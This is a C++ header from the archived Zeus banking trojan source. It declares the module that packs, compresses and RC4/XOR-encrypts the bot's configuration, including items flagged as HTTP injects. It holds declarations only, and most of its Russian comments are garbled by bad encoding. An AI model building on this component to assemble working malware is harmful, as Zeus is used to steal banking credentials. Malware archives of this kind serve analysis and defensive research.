/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ������ � �������� ����������.

  ����������: ���������� ID ����� ���� wID1 == wID2 � ITEMF_IS_* == ITEMF_IS_*.
*/
#pragma once

#include "crypt.h"

#define BINSTORAGE_MAX_SIZE (10 * 1024 * 1024) //WININET_MAXBYTES_TO_MEM

namespace BinStorage
{
  //Flags for the ITEM.
  enum
  {
    ITEMF_COMPRESSED        = 0x00000001, //Data is compressed.
    
    //These flags are used to indicate the status of rewriting.
    ITEMF_COMBINE_ADD       = 0x00010000, //Append mode if the option suschetvuet, the record does not occur.
    ITEMF_COMBINE_OVERWRITE = 0x00020000, //Overwrite mode, if the option is not suschetvuet, a new record.
    ITEMF_COMBINE_REPLACE   = 0x00040000, //Regime change, if the option is not suschetvuet, recording is not happening.
    ITEMF_COMBINE_DELETE    = 0x00080000, //Delete mode previous one element and tekusheyu.
    ITEMF_COMBINE_MASK      = ITEMF_COMBINE_ADD | ITEMF_COMBINE_OVERWRITE | ITEMF_COMBINE_REPLACE | ITEMF_COMBINE_DELETE,

    //These flags are introduced to reduce the risk of overlap dwID.
    ITEMF_IS_OPTION         = 0x10000000, //The element is optional.
    ITEMF_IS_SETTING        = 0x20000000, //Element is the setting.
    ITEMF_IS_HTTP_INJECT    = 0x40000000, //Element is the http-injected.
    ITEMF_IS_MASK           = ITEMF_IS_OPTION | ITEMF_IS_SETTING | ITEMF_IS_HTTP_INJECT
  };

  #pragma pack(push, 1)
  //Header.
  typedef struct
  {
    BYTE randData[20];                //Proizvolnye data.
    DWORD size;                       //Full-size store.
    DWORD flags;                      //Flags.
    DWORD count;                      //Kolichetsvo options.
    BYTE md5Hash[16/*MD5HASH_SIZE*/]; //MD5 hash of p + sizeof (CONFIGHEADER) to p + dwSize.
  }STORAGE;
  
  //Element.
  typedef struct
  {
    DWORD id;       //ID option, usually CRC32.
    DWORD flags;    //Flags.
    DWORD size;     //The size of compressed data if the flag is set ITEMF_COMPRESSED. Otherwise equal realSize.
    DWORD realSize; //The actual size of the data.
  }ITEM;
  #pragma pack(pop)

  //Flags for _openStorageFile ().
  enum
  {
    OSF_WRITE_ACCESS = 0x1 //Suschetvuet open file for writing, or create a new one in case
                           //otsutviya file.
  };
  
  //Data on hranilishi.
  typedef struct
  {
    HANDLE file;     //OUT file handle.
    DWORD64 curItem; //OUT position of the current element.
    DWORD xorKey;    //IN XOR encryption mask.
  }STORAGEARRAY;
  
  //Flags for _Pack.
  enum
  {
    PACKF_FINAL_MODE = 0x1 //Mode finalizing used to build the final configuration,
                           //priminyaet flags ITEMF_COMBINE_ *.
  };
  
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� ��� ���������.

    IN binStorage - ���������

    Return - true - � ������ ���������� ����,
             false - � ������ ������.
  */
  bool _checkHash(STORAGE *binStorage);
  
  /*
    �������� ������� ���������.

    Return - ��������� (������ ���� ������ ����� Mem),
             ��� NULL � ������ ������.
  */
  STORAGE *_createEmpty(void);
  
  /*
    ���������� �������� � ���������.

    IN OUT binStorage - ���������.
    IN id             - ID ����� �����.
    IN flags          - ����� ITEMF_*.
    IN data           - ������ �����.
    IN dataSize       - ������ ������.

    Return            - true, � ������ ��������� ����������,
                        false, � ������ ������. 
    
    ����������: ������� ����� �� ���������� �� �����������.
  */
  bool _addItem(STORAGE **binStorage, DWORD id, DWORD flags, void *data, DWORD dataSize);
  
  /*
    ���������� Unicode-������ � ��������� ��� UTF-8 ������.

    IN OUT binStorage - ���������.
    IN id             - ID ����� �����.
    IN flags          - ����� ITEMF_*.
    IN string         - ������ ��� ����������.

    Return            - true, � ������ ��������� ����������,
                        false, � ������ ������.     
  */
  bool _addItemAsUtf8StringW(STORAGE **binStorage, DWORD id, DWORD flags, LPWSTR string);
  
  /*
    ���������� ANSI-������ � ��������� ��� UTF-8 ������.

    IN OUT binStorage - ���������.
    IN id             - ID ������ ��������.
    IN flags          - ����� ITEMF_*.
    IN string         - ������ ��� ����������.

    Return            - true, � ������ ��������� ����������,
                        false, � ������ ������.     
  */
  bool _addItemAsUtf8StringA(STORAGE **binStorage, DWORD id, DWORD flags, LPSTR string);

  /*
    ����������� ��������.

    IN OUT binStorage - ���������.
    IN item           - ������� ��� ����������� (����� ����������� ������� ����� ����� ���� ��
                        �����������).
    IN flags          - ����� ITEMF_*.
    IN data           - ������ �����.
    IN dataSize       - ������ ������.

    Return            - true, � ������ ��������� ����������,
                        false, � ������ ������. 
  */
  bool _modifyItem(STORAGE **binStorage, ITEM *item, DWORD flags, void *data, DWORD dataSize);
  
  /*
    ����������� ��������.

    IN OUT binStorage - ���������.
    IN id             - ������� ��� �����������.
    IN flags          - ����� ITEMF_*.
    IN data           - ������ �����.
    IN dataSize       - ������ ������.

    Return            - true, � ������ ��������� ����������,
                        false, � ������ ������. 
  */
  bool _modifyItemById(STORAGE **binStorage, DWORD id, DWORD flags, void *data, DWORD dataSize);
  
  /*
    ��������� ���������� �������� �� ���������.

    IN binStorage - ���������.
    IN curItem    - ������� �������, ��� NULL ��� ��������� ������� ��������.

    Return        - ��������� ������� ������������ curItem, ��� NULL ���� ��������� ������ �� �������.
  */
  ITEM *_getNextItem(const STORAGE *binStorage, ITEM *curItem);

  /*
    ��������� �������� �� ���������.

    IN binStorage - ���������.
    IN id         - ID ��������.
    IN isFlag     - ���� �� ������ ITEMF_IS_* ��� ����������� ���� ��������.

    Return        - �������� �������, ��� NULL ���� ������� �� ������.
  */
  ITEM *_getItem(const STORAGE *binStorage, DWORD id, DWORD isFlag);
  
  /*
    ��������� ����������� �������� �� ���������.

    IN pi  - ��������.

    Return - ������ ��������(������ ���� ����������� ����� Mem), ��� NULL ���� ������ ���.

    ����������: ��� ���������� ������ � ����� ������ ����������� �������������� ������� WCHAR-������,
                ��� ��������� ��������� �������� �� ��������.
  */
  void *_getItemData(const ITEM *item);

  /*
    ��������� ����������� �������� �� ���������. �������� ��� _GetItem � _GetItemData.

    IN binStorage - ���������.
    IN id         - ID ��������.
    IN isFlag     - ���� �� ������ ITEMF_IS_* ��� ����������� ���� ��������.
    OUT size      - ������ ������. ����� ���� NULL.

    Return        - ������ ��������(������ ���� ����������� ����� Mem), ��� NULL ���� ������ ���.
  */
  void *_getItemDataEx(const STORAGE *binStorage, DWORD id, DWORD isFlag, LPDWORD size);

  /*
    ��������� ����������� �������� �� ��������� ��� DWORD.

    IN binStorage - ���������.
    IN id         - ID ��������.
    IN isFlag     - ���� �� ������ ITEMF_IS_* ��� ����������� ���� ��������.
    OUT data      - ������. ����� ���� NULL, ���� �������� �� �����.

    Return        - true - � ������ ������,
                    false - � ������ ������.
  */
  bool _getItemDataAsDword(const STORAGE *binStorage, DWORD id, DWORD isFlag, LPDWORD data);
  
  /*
    �������� ���������.

    IN OUT binStorage - �� ����� ��������� ��� ���������, �� ������ ����������� ���������,
                        ������� ��� �� �������� ��� �������������. ��� ���������� �������������
                        ����� �������� _unpack().
    IN flags          - ����� �����������, ������������ ��� ������ ��������� ���������, ���������
                        ����� PACKF_*.
    IN rc4Key         - ���� ���������� ��� NULL ���� ���������� �� �����. ���� �� ����������.

    Return            - ������ ���������, ��� 0 � ������ ������.
  */
  DWORD _pack(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key);

DWORD _pack2(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key);

  /*
    ���������� ������������.

    OUT binStorage - ���������. ������ ���� ����������� ����� Mem. ���� binStorage == NULL, ��
                     ���������� ���������� ������ data.
    IN OUT data    - ������ ������� �������� ���������� ����������. ���� binStorage == NULL, ��
                     ���������� ���������� ������ data.
    IN dataSize    - ������ data.
    IN rc4Key      - ���� ���������� ��� NULL ���� ���������� �� �����.

    Return         - ������ ���������, ��� 0 � ������ ������, ����� *binStorage ����� ����� NULL.
  */
  DWORD _unpack(STORAGE **binStorage, void *data, DWORD dataSize, Crypt::RC4KEY *rc4Key);

  /*
    ���������� ��������� �� �����.

    OUT binStorage - ���������. ������ ���� ����������� ����� Mem.
    IN fileName    - ���� ���������.
    IN rc4Key      - ���� ���������� ��� NULL ���� ���������� �� �����.

    Return          - ������ ���������, ��� 0 � ������ ������, ����� *binStorage ����� ����� NULL.
  */
  DWORD _unpackFromFile(STORAGE **binStorage, LPWSTR fileName, Crypt::RC4KEY *rc4Key);
  
  /*
    ���������� ��� ��������� � ���� �����. ������� ��������� ������ ���� �����������.

    IN binStorage1 - ������ ���������.
    IN binStorage2 - ������ ���������.

    Return         - ����� ���������, ��� NULL � ������ ������.
  */
  STORAGE *_combine(STORAGE *binStorage1, STORAGE *binStorage2);

  /*
    ��������/�������� ����� �������. ��� �������� �����, ����������� ��� ������������,
    � �� ����������� ����������� ������ (��� ���� ����� ������ ����� ���� �������).

    IN fileName         - ��� �����.
    IN flags            - ����� OSF_.
    IN OUT storageArray - ������ �� �������. �� ����� ������ ���� ���������� ��� � ��������.

    Return              - true - � ������ ��������� �������� �����,
                          false - � ������ ������ �������� ��� ����������� ������ � �����(
                          storage->file ����� ����� INVALID_HANDLE_VALUE).

    ����������: � ������ �������� false: flags & OSF_WRITE_ACCESS �
                GetLastError() != ERROR_ACCESS_DEFINED ������������ ������� ����, � ��������� ������
                ����������� ��������� ������ ������ ���� ����� OSF_WRITE_ACCESS.
  */
  bool _openStorageArray(LPWSTR fileName, DWORD flags, STORAGEARRAY *storageArray);
  
  /*
    ��������� ������.
    
    IN OUT storageArray - ������.

    ����������: �� ������ storageArray->file ����� ����� INVALID_HANDLE_VALUE.
  */
  void _closeStorageArray(STORAGEARRAY *storageArray);
  
  /*
    ���������� ��������� � ����� �������.

    IN storageArray - ������.
    IN binStorage   - ������������� ���������.
    IN size         - ������ ���������.

    Return          - true - � ������ ������,
                      false - � ������ ������.
  */
  bool _addToStorageArray(STORAGEARRAY *storageArray, STORAGE *binStorage, DWORD size);
  
  /*
    ���������� ��������� ������� ����������� ��������� �� �������.
    
    IN storageArray - ������.
  */
  void _resetStorageArrayPointer(STORAGEARRAY *storageArray);
  
  /*
    �������� ��������� ��������� � �������. ������� �������� _unpack ��� �������� �
    ��������������� ���������.

    IN storageArray - ������.
    OUT binStorage  - ���������. ������ ���� ����������� ����� Mem.
    OUT size        - ������ ���������.
    IN rc4Key       - ���� ���������� ��� NULL.

    Return          - true - � ������ ������, ���� *size - �� ��������� ����� �����,
                      false - � ������ ������.
  */
  bool _getNextFromStorageArray(STORAGEARRAY *storageArray, STORAGE **binStorage, LPDWORD size, Crypt::RC4KEY *rc4Key);
  
  /*    Removes the current repository of the array.
    
    IN storageArray - array.
    
    Return - true - if successful,
                      false - if an error occurs.
  */
  bool _removeCurrentFromStorageArray(STORAGEARRAY *storageArray);
};
